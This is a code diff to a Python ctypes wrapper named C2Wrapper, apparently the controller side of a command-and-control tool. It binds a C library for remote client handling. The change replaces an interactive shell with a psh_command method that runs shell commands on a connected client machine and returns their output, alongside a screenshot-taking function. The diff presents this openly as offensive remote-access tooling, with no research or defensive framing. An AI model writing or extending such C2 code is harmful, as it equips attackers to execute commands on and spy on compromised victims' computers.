@@ -43,8 +43,10 @@ class C2Wrapper:
         self.lib.client_info.restype = c_void_p
         
         # void psh_handle(sock_t client_fd)
-        self.lib.psh_handle.argtypes = [c_int]
-        self.lib.psh_handle.restype = None
+        # char* psh_handle(sock_t client_fd, char* cmd)
+        # Returns an allocated C string containing the command output (caller must free)
+        self.lib.psh_handle.argtypes = [c_int, c_char_p]
+        self.lib.psh_handle.restype = c_void_p
         
         # void screenshot_handle(sock_t client_fd)
         self.lib.screenshot_handle.argtypes = [c_int]
@@ -182,8 +184,28 @@ class C2Wrapper:
         """
         if self.client_fd is None:
             raise RuntimeError("Client not connected. Call setup() first.")
-        
-        self.lib.psh_handle(self.client_fd)
+        raise NotImplementedError("Interactive shell is removed; use psh_command(cmd) instead")
+
+    def psh_command(self, cmd: str) -> str:
+        """
+        Execute a single shell command on the client and return its output as a string.
+        Caller is responsible for handling/displaying the output.
+        """
+        if self.client_fd is None:
+            raise RuntimeError("Client not connected. Call setup() first.")
+
+        if cmd is None:
+            return ""
+
+        cmd_bytes = cmd.encode('utf-8')
+        ptr = self.lib.psh_handle(self.client_fd, cmd_bytes)
+        if not ptr:
+            return ""
+
+        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
+        # free allocated memory from C
+        self._free_cstring(ptr)
+        return result
     
     def take_screenshot(self):
         """
